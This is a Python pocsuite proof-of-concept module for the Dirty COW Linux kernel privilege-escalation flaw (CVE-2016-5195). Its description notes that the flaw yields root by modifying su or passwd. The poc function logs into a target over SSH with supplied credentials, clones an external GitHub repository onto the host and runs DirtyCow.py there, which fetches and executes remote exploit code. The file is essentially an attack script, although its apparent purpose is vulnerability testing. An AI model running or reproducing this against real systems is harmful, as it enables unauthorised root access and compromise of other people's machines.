#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import paramiko
poc_code = """
git clone https://github.com/WeiiHong/test1
"""

class TestPOC(POCBase):
    name = 'liunx_cve-2016-5195'
    vulID = 'CVE-2016-5195'
    author = ['weihong','mfz']
    vulType = ''
    version = '1.1'  # default version: 1.0
    references = ['']
    desc = '''
		   该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。
		   修改su或者passwd程序就可以达到root的目的。
		   低权限用户利用该漏洞可以在众多Linux系统上实现本地提权。
		   '''
    vulDate = '2016-10-22'
    createDate = '2020-03-06'
    updateDate = '2020-11-27'
    appName = 'Liunx'
    appVersion = 'Linux kernel >= 2.6.22 < 3.9'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()
    def _verify(self):
        '''verify mode'''
        result = {}
        result1 = poc(self.url)
        if result1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' CVE-2016-5195' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

# 本地写入文件方法
def write_poc(code, file):
    with open(file, 'w') as f:
        f.write(code)
test_content="no"


def poc(url):
    #host_ip=raw_input("ip=")
    user_name=raw_input("uname=")
    password=raw_input("pwd=")
    ip=str(url)[7:]
    ls_command = "pwd"
    command = ls_command
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip,username=user_name,password=password)
    #ssh.connect('192.0.0.1',username='admin',password=password)


    stdin, stdout, stderr = ssh.exec_command(command)
    out = stdout.readlines()
    err = stderr.readlines()
    #print out,err

    stdin, stdout, stderr = ssh.exec_command("whoami")
    out = stdout.readlines()
    err = stderr.readlines()

    stdin, stdout, stderr = ssh.exec_command("git clone https://github.com/WeiiHong/test1")
    out = stdout.readlines()
    err = stderr.readlines()

    stdin, stdout, stderr = ssh.exec_command("cd test1 && ls && python DirtyCow.py && cat mc_tmp")
    out = stdout.readlines()
    err = stderr.readlines()
    #print out,err
    ssh.close()

    if out[-1]=='no' or out[-1]=='':
        #print "no"
        return False
    else:
        #print "yes"
        return True

register(TestPOC)
